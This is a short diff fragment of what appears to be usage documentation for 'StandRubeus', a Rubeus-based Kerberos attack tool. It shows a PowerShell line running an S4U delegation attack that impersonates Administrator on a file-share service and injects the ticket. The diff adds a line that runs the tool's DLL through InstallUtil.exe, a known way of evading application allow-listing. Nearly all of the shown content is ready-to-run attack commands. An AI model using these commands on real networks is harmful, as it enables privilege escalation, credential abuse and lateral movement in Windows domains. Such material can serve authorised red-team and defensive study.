@@ -29,6 +29,10 @@ $assem = [System.Reflection.Assembly]::Load($ass)
 [Rubeus.Program]::Main("s4u /user:server01 /rc4:sdsafgsa08ac2d2sad5988cbsda /impersonateuser:Administrator /msdsspn:cifs/server02 /ptt".Split())
 ```
 
+```text
+ C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile=  /cmd="hash" /args="/password:polo" .\StandRubeus.dll
+```
+
 ## Monitor for TGT
 
 ```text
